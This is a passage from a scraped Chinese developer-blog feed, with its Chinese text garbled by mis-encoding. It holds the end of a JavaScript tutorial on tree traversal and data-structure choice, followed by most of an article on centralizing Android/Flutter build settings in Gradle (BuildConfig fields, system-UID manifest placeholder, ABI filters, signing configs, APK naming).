    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_inorder</span>(node.<span class="hljs-property">right</span>, callback, result);
  }

  <span class="hljs-comment">// ååºéå†ï¼šå·¦ â†’ å³ â†’ æ ¹</span>
  <span class="hljs-title function_">postorderTraversal</span>(<span class="hljs-params">callback</span>) {
    <span class="hljs-keyword">const</span> result = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_postorder</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>, callback, result);
    <span class="hljs-keyword">return</span> result;
  }

  <span class="hljs-title function_">_postorder</span>(<span class="hljs-params">node, callback, result</span>) {
    <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// éå†å·¦å­æ ‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_postorder</span>(node.<span class="hljs-property">left</span>, callback, result);

    <span class="hljs-comment">// éå†å³å­æ ‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_postorder</span>(node.<span class="hljs-property">right</span>, callback, result);

    <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (callback) <span class="hljs-title function_">callback</span>(node);
    result.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">value</span>);
  }

  <span class="hljs-comment">// å±‚åºéå†ï¼šæŒ‰å±‚çº§ä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦åˆ°å³</span>
  <span class="hljs-title function_">levelOrderTraversal</span>(<span class="hljs-params">callback</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span> === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> [];

    <span class="hljs-keyword">const</span> result = [];
    <span class="hljs-keyword">const</span> queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CircularQueue</span>(<span class="hljs-number">100</span>);
    queue.<span class="hljs-title function_">enqueue</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>);

    <span class="hljs-keyword">while</span> (!queue.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">const</span> node = queue.<span class="hljs-title function_">dequeue</span>();

      <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹</span>
      <span class="hljs-keyword">if</span> (callback) <span class="hljs-title function_">callback</span>(node);
      result.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">value</span>);

      <span class="hljs-comment">// å°†å­èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—</span>
      <span class="hljs-keyword">if</span> (node.<span class="hljs-property">left</span>) {
        queue.<span class="hljs-title function_">enqueue</span>(node.<span class="hljs-property">left</span>);
      }
      <span class="hljs-keyword">if</span> (node.<span class="hljs-property">right</span>) {
        queue.<span class="hljs-title function_">enqueue</span>(node.<span class="hljs-property">right</span>);
      }
    }

    <span class="hljs-keyword">return</span> result;
  }

  <span class="hljs-comment">// æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</span>
  <span class="hljs-title function_">dfs</span>(<span class="hljs-params">targetValue</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_dfs</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>, targetValue);
  }

  <span class="hljs-title function_">_dfs</span>(<span class="hljs-params">node, targetValue</span>) {
    <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// æ£€æŸ¥å½“å‰èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (node.<span class="hljs-property">value</span> === targetValue) {
      <span class="hljs-keyword">return</span> node;
    }

    <span class="hljs-comment">// æœç´¢å·¦å­æ ‘</span>
    <span class="hljs-keyword">const</span> leftResult = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_dfs</span>(node.<span class="hljs-property">left</span>, targetValue);
    <span class="hljs-keyword">if</span> (leftResult !== <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">return</span> leftResult;
    }

    <span class="hljs-comment">// æœç´¢å³å­æ ‘</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_dfs</span>(node.<span class="hljs-property">right</span>, targetValue);
  }

  <span class="hljs-comment">// å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰</span>
  <span class="hljs-title function_">bfs</span>(<span class="hljs-params">targetValue</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span> === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">const</span> queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CircularQueue</span>(<span class="hljs-number">100</span>);
    queue.<span class="hljs-title function_">enqueue</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>);

    <span class="hljs-keyword">while</span> (!queue.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">const</span> node = queue.<span class="hljs-title function_">dequeue</span>();

      <span class="hljs-comment">// æ£€æŸ¥å½“å‰èŠ‚ç‚¹</span>
      <span class="hljs-keyword">if</span> (node.<span class="hljs-property">value</span> === targetValue) {
        <span class="hljs-keyword">return</span> node;
      }

      <span class="hljs-comment">// å°†å­èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—</span>
      <span class="hljs-keyword">if</span> (node.<span class="hljs-property">left</span>) {
        queue.<span class="hljs-title function_">enqueue</span>(node.<span class="hljs-property">left</span>);
      }
      <span class="hljs-keyword">if</span> (node.<span class="hljs-property">right</span>) {
        queue.<span class="hljs-title function_">enqueue</span>(node.<span class="hljs-property">right</span>);
      }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }
}
</code></pre>
<h2 data-id="heading-21">æ•°æ®ç»“æ„é€‰æ‹©çš„å…³é”®å› ç´ </h2>
<h3 data-id="heading-22">è®¿é—®æ¨¡å¼</h3>
<ul>
<li>éšæœºè®¿é—®ï¼šæ•°ç»„ï¼ˆO(1)ï¼‰</li>
<li>é¡ºåºè®¿é—®ï¼šé“¾è¡¨ã€æ ˆã€é˜Ÿåˆ—</li>
<li>å±‚çº§è®¿é—®ï¼šæ ‘</li>
</ul>
<h3 data-id="heading-23">æ“ä½œé¢‘ç‡</h3>
<ul>
<li>é¢‘ç¹æ’å…¥/åˆ é™¤å¼€å¤´ï¼šé“¾è¡¨</li>
<li>é¢‘ç¹æ’å…¥/åˆ é™¤ä¸¤ç«¯ï¼šåŒç«¯é˜Ÿåˆ—</li>
<li>é¢‘ç¹éšæœºè®¿é—®ï¼šæ•°ç»„</li>
</ul>
<h3 data-id="heading-24">å†…å­˜è€ƒè™‘</h3>
<ul>
<li>å†…å­˜è¿ç»­ï¼šæ•°ç»„ï¼ˆç¼“å­˜å‹å¥½ï¼‰</li>
<li>å†…å­˜åˆ†æ•£ï¼šé“¾è¡¨ï¼ˆæ— æ‰©å®¹æˆæœ¬ï¼‰</li>
<li>åŠ¨æ€å¤§å°ï¼šé“¾è¡¨ã€æ ‘</li>
</ul>
<h2 data-id="heading-25">ç»“è¯­</h2>
<p>æœ¬æ–‡è®²è§£äº†æ ˆã€é˜Ÿåˆ—å’Œæ ‘çš„å®ç°ä¸åº”ç”¨ï¼Œç†è§£è¿™äº›æ•°æ®ç»“æ„ï¼Œä¸ä»…èƒ½å¸®åŠ©æˆ‘ä»¬åœ¨é¢è¯•ä¸­è¡¨ç°å‡ºè‰²ï¼Œæ›´èƒ½è®©æˆ‘ä»¬åœ¨å®é™…å¼€å‘ä¸­å†™å‡ºæ›´é«˜æ•ˆã€æ›´å¯é çš„ä»£ç ã€‚å¯¹äºæ–‡ç« ä¸­é”™è¯¯çš„åœ°æ–¹æˆ–è€…æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€è®¨è®ºï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android/Flutter é¡¹ç›®ç»Ÿä¸€æ„å»ºé…ç½®æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7604485275372781631</link>    <guid>https://juejin.cn/post/7604485275372781631</guid>    <pubDate>2026-02-09T09:59:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604485275372781631" data-draft-id="7604485275372765247" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android/Flutter é¡¹ç›®ç»Ÿä¸€æ„å»ºé…ç½®æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="Flutter,Android"/> <meta itemprop="datePublished" content="2026-02-09T09:59:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯å°ä¼™è®¡"/> <meta itemprop="url" content="https://juejin.cn/user/430664289630157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android/Flutter é¡¹ç›®ç»Ÿä¸€æ„å»ºé…ç½®æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/430664289630157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯å°ä¼™è®¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:59:47.000Z" title="Mon Feb 09 2026 09:59:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ¦‚è¿°</h2>
<p>ä¸€ç§åœ¨ Android é¡¹ç›®ä¸­é€šè¿‡ <a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">build.gradle</a> å®šä¹‰ç»Ÿä¸€é…ç½®å¯¹è±¡çš„æ–¹æ¡ˆï¼Œå®ç°å¯¹ Android å’Œ Flutter åŒç«¯æ„å»ºè¡Œä¸ºçš„é›†ä¸­ç®¡ç†ã€‚è¯¥æ–¹æ¡ˆå…è®¸é€šè¿‡å•ä¸€é…ç½®æºæ§åˆ¶æ‰“åŒ…æ¶æ„ã€ç­¾åæ–¹å¼ã€åº”ç”¨æ ‡è¯†ç­‰å…³é”®æ„å»ºå‚æ•°ï¼Œç‰¹åˆ«é€‚åˆéœ€è¦ç®¡ç†å¤šä¸ªç¡¬ä»¶å¹³å°æˆ–äº§å“å˜ä½“çš„é¡¹ç›®ã€‚</p>
<hr/>
<h2 data-id="heading-1">æ ¸å¿ƒè®¾è®¡</h2>
<h3 data-id="heading-2">é…ç½®å®šä¹‰</h3>
<p>åœ¨ <a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">build.gradle</a> æ–‡ä»¶é¡¶éƒ¨å®šä¹‰é…ç½®å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">def releaseConfig = [
    buildModel  : "modelA",    // æ„å»ºæ¨¡å¼ï¼šmodelA, modelB
    appVersion  : "1.14.005",  // åº”ç”¨ç‰ˆæœ¬å·
]
</code></pre>
<h3 data-id="heading-3">æ´¾ç”Ÿé…ç½®</h3>
<p>åŸºäºåŸºç¡€é…ç½®è‡ªåŠ¨è®¡ç®—æ´¾ç”Ÿå±æ€§ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">releaseConfig["useSystemSign"] = (releaseConfig["buildModel"] == "modelA")
releaseConfig["appName"]       = (releaseConfig["buildModel"] == "modelA" ? "AppVariantA" : "AppVariantB")
</code></pre>
<h3 data-id="heading-4">é…ç½®å‚æ•°è¯´æ˜</h3>



































<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>è¯´æ˜</th><th>ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td><code>buildModel</code></td><td>String</td><td>æ„å»ºæ¨¡å¼æ ‡è¯†</td><td><code>"modelA"</code>, <code>"modelB"</code></td></tr><tr><td><code>appVersion</code></td><td>String</td><td>åº”ç”¨ç‰ˆæœ¬å·</td><td><code>"1.14.005"</code></td></tr><tr><td><code>useSystemSign</code></td><td>Boolean</td><td>æ˜¯å¦ä½¿ç”¨ç³»ç»Ÿç­¾åï¼ˆæ´¾ç”Ÿï¼‰</td><td><code>true</code> / <code>false</code></td></tr><tr><td><code>appName</code></td><td>String</td><td>åº”ç”¨åç§°æ ‡è¯†ï¼ˆæ´¾ç”Ÿï¼‰</td><td><code>"AppVariantA"</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">é…ç½®åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-6">1. BuildConfig å­—æ®µæ³¨å…¥</h3>
<p>å°†é…ç½®æ³¨å…¥ä¸º Android BuildConfig å¸¸é‡ï¼Œä¾› Java/Kotlin å’Œ Flutter ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">android {
    defaultConfig {
        buildConfigField("String", "buildModel",  "\"${releaseConfig['buildModel']}\"")
        buildConfigField("String", "appName",     "\"${releaseConfig['appName']}\"")
        buildConfigField("String", "appVersion",  "\"${releaseConfig['appVersion']}\"")
    }
}
</code></pre>
<h4 data-id="heading-7">Android ä¾§ä½¿ç”¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.example.myapp.BuildConfig;

<span class="hljs-comment">// æ ¹æ®æ„å»ºæ¨¡å¼æ‰§è¡Œä¸åŒé€»è¾‘</span>
<span class="hljs-keyword">if</span> (BuildConfig.buildModel.equals(<span class="hljs-string">"modelA"</span>)) {
    <span class="hljs-comment">// ModelA ç‰¹å®šé€»è¾‘</span>
}

<span class="hljs-comment">// è·å–ç‰ˆæœ¬ä¿¡æ¯</span>
<span class="hljs-type">String</span> <span class="hljs-variable">appName</span> <span class="hljs-operator">=</span> BuildConfig.appName;
<span class="hljs-type">String</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> BuildConfig.appVersion;
</code></pre>
<h4 data-id="heading-8">Flutter ä¾§è·å–é…ç½®</h4>
<p>é€šè¿‡ MethodChannel ä» Android è·å–é…ç½®ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Android ç«¯ä¼ é€’é…ç½®</span>
Map&lt;String, String&gt; configMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
configMap.put(<span class="hljs-string">"buildModel"</span>, BuildConfig.buildModel);
configMap.put(<span class="hljs-string">"appName"</span>, BuildConfig.appName);
configMap.put(<span class="hljs-string">"appVersion"</span>, BuildConfig.appVersion);
result.success(configMap);
</code></pre>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Flutter ç«¯æ¥æ”¶</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppConfig</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">String?</span> buildModel;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">String?</span> appName;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">String?</span> appVersion;

  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; loadConfig() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> config = <span class="hljs-keyword">await</span> platform.invokeMethod(<span class="hljs-string">'getBuildConfig'</span>);
    buildModel = config[<span class="hljs-string">'buildModel'</span>];
    appName = config[<span class="hljs-string">'appName'</span>];
    appVersion = config[<span class="hljs-string">'appVersion'</span>];
  }

  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isModelA =&gt; buildModel == <span class="hljs-string">'modelA'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isModelB =&gt; buildModel == <span class="hljs-string">'modelB'</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-9">2. Manifest å ä½ç¬¦é…ç½®</h3>
<p>é€šè¿‡ <code>manifestPlaceholders</code> åŠ¨æ€é…ç½® AndroidManifest.xmlï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">android {
    defaultConfig {
        manifestPlaceholders = [
            sharedUserId: releaseConfig["useSystemSign"] ? "android.uid.system" : ""
        ]
    }
}
</code></pre>
<p><strong>AndroidManifest.xml</strong>ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span>
    <span class="hljs-attr">android:sharedUserId</span>=<span class="hljs-string">"${sharedUserId}"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- ... --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span>
</code></pre>
<h4 data-id="heading-10">åº”ç”¨åœºæ™¯è¯´æ˜</h4>























<table><thead><tr><th>æ„å»ºæ¨¡å¼</th><th><code>useSystemSign</code></th><th>sharedUserId å€¼</th><th>æƒé™çº§åˆ«</th></tr></thead><tbody><tr><td>ModelA</td><td><code>true</code></td><td><code>android.uid.system</code></td><td>ç³»ç»Ÿåº”ç”¨æƒé™</td></tr><tr><td>ModelB</td><td><code>false</code></td><td><code>""</code> ï¼ˆç©ºå­—ç¬¦ä¸²ï¼‰</td><td>æ™®é€šåº”ç”¨æƒé™</td></tr></tbody></table>
<blockquote>
<p>[!IMPORTANT]
ä½¿ç”¨ <code>android.uid.system</code> éœ€è¦åº”ç”¨ä½¿ç”¨<strong>ç³»ç»Ÿå¹³å°ç­¾å</strong>æ‰“åŒ…ï¼Œå¦åˆ™åº”ç”¨æ— æ³•å®‰è£…ã€‚è¯¥ UID å¯èµ‹äºˆåº”ç”¨ç³»ç»Ÿçº§æƒé™ï¼Œå¦‚ï¼š</p>
<ul>
<li>ä¿®æ”¹ç³»ç»Ÿè®¾ç½®ï¼ˆ<code>WRITE_SETTINGS</code>ï¼‰</li>
<li>é‡å¯è®¾å¤‡ï¼ˆ<code>REBOOT</code>ï¼‰</li>
<li>è®¾ç½®ç³»ç»Ÿæ—¶é—´ï¼ˆ<code>SET_TIME</code>ï¼‰</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-11">3. ABI æ¶æ„è¿‡æ»¤</h3>
<p>æ ¹æ®ç›®æ ‡ç¡¬ä»¶å¹³å°åŠ¨æ€é€‰æ‹©æ‰“åŒ…æ¶æ„ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">android {
    defaultConfig {
        ndk {
            // å¯é€‰æ¶æ„: "x86", "arm64-v8a", "x86_64", "armeabi-v7a"
            abiFilters (releaseConfig["useSystemSign"] ? "arm64-v8a" : "armeabi-v7a")
        }
    }
}
</code></pre>
<h4 data-id="heading-12">ABI é€‰æ‹©ç­–ç•¥</h4>























<table><thead><tr><th>æ„å»ºæ¨¡å¼</th><th>ABI æ¶æ„</th><th>é€‚ç”¨åœºæ™¯</th><th>APK å¤§å°</th></tr></thead><tbody><tr><td>ModelA</td><td><code>arm64-v8a</code></td><td>64ä½ARMè®¾å¤‡ï¼Œç°ä»£é«˜æ€§èƒ½ç¡¬ä»¶</td><td>è¾ƒå¤§</td></tr><tr><td>ModelB</td><td><code>armeabi-v7a</code></td><td>32ä½ARMè®¾å¤‡ï¼Œå…¼å®¹æ—§ç¡¬ä»¶</td><td>è¾ƒå°</td></tr></tbody></table>
<blockquote>
<p>[!TIP]
åªæ‰“åŒ…å•ä¸€æ¶æ„å¯æ˜¾è‘—å‡å° APK ä½“ç§¯ï¼ˆçº¦ 50%ï¼‰ï¼Œä½†éœ€ç¡®ä¿ç›®æ ‡è®¾å¤‡æ”¯æŒè¯¥æ¶æ„ã€‚ä¹Ÿå¯ä»¥é…ç½®å¤šæ¶æ„æ”¯æŒï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">abiFilters "arm64-v8a", "armeabi-v7a"
</code></pre>
</blockquote>
<hr/>
<h3 data-id="heading-13">4. ç­¾åé…ç½®åŠ¨æ€é€‰æ‹©</h3>
<p>å®šä¹‰å¤šå¥—ç­¾åé…ç½®ï¼Œæ ¹æ®æ„å»ºæ¨¡å¼è‡ªåŠ¨é€‰æ‹©ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">android {
    signingConfigs {
        systemSign {
            keyAlias "platform"
            storeFile file("../keys/platform.jks")
            storePassword "password"
            keyPassword "password"
        }

        normalSign {
            keyAlias "release"
            storeFile file("../keys/release.jks")
            storePassword "password"
            keyPassword "password"
        }
    }

    buildTypes {
        release {
            signingConfig (releaseConfig["useSystemSign"] 
                ? signingConfigs.systemSign 
                : signingConfigs.normalSign)
        }
        debug {
            signingConfig (releaseConfig["useSystemSign"] 
                ? signingConfigs.systemSign 
                : signingConfigs.normalSign)
        }
    }
}
</code></pre>
<h4 data-id="heading-14">ç­¾åé…ç½®å¯¹ç…§</h4>























<table><thead><tr><th>æ„å»ºæ¨¡å¼</th><th>ç­¾åé…ç½®</th><th>å¯†é’¥æ–‡ä»¶</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>ModelA</td><td><code>systemSign</code></td><td><code>platform.jks</code></td><td>ç³»ç»Ÿåº”ç”¨ç­¾åï¼ŒåŒ¹é…ç³»ç»Ÿå›ºä»¶</td></tr><tr><td>ModelB</td><td><code>normalSign</code></td><td><code>release.jks</code></td><td>æ™®é€šåº”ç”¨ç­¾å</td></tr></tbody></table>
<blockquote>
<p>[!CAUTION]</p>
<ul>
<li>ç³»ç»Ÿå¹³å°ç­¾åå¯†é’¥ï¼ˆ<code>platform.jks</code>ï¼‰å¿…é¡»ä¸ç›®æ ‡è®¾å¤‡ç³»ç»Ÿå›ºä»¶ç­¾åä¸€è‡´</li>
<li>ç­¾åä¸åŒ¹é…ä¼šå¯¼è‡´ä½¿ç”¨ <code>android.uid.system</code> çš„åº”ç”¨æ— æ³•å®‰è£…</li>
<li>ç”Ÿäº§ç¯å¢ƒå¯†é’¥åº”é€šè¿‡ç¯å¢ƒå˜é‡æˆ–å¯†é’¥ç®¡ç†ç³»ç»Ÿæ³¨å…¥ï¼Œé¿å…ç¡¬ç¼–ç </li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-15">5. APK è¾“å‡ºæ–‡ä»¶å‘½å</h3>
<p>è‡ªåŠ¨ç”Ÿæˆè§„èŒƒåŒ–çš„ APK æ–‡ä»¶åï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">android {
    applicationVariants.all { variant -&gt;
        variant.outputs.all {
            outputFileName = "${releaseConfig['appName']}.${releaseConfig['appVersion']}.apk"
        }
    }
}
</code></pre>
<h4 data-id="heading-16">æ–‡ä»¶åç¤ºä¾‹</h4>




















<table><thead><tr><th>æ„å»ºæ¨¡å¼</th><th>ç‰ˆæœ¬å·</th><th>è¾“å‡ºæ–‡ä»¶å</th></tr></thead><tbody><tr><td>ModelA</td><td>1.14.005</td><td><code>AppVariantA.1.14.005.apk</code></td></tr><tr><td>ModelB</td><td>1.14.005</td><td><code>AppVariantB.1.14.005.apk</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-17">é…ç½®åˆ‡æ¢ç­–ç•¥</h2>
<h3 data-id="heading-18">æ–¹æ³•1ï¼šæ‰‹åŠ¨ä¿®æ”¹é…ç½®æ–‡ä»¶</h3>
<p>é€‚ç”¨äºæœ¬åœ°å¼€å‘ç¯å¢ƒï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">def releaseConfig = [
    buildModel  : "modelB",    // åˆ‡æ¢ä¸º ModelB
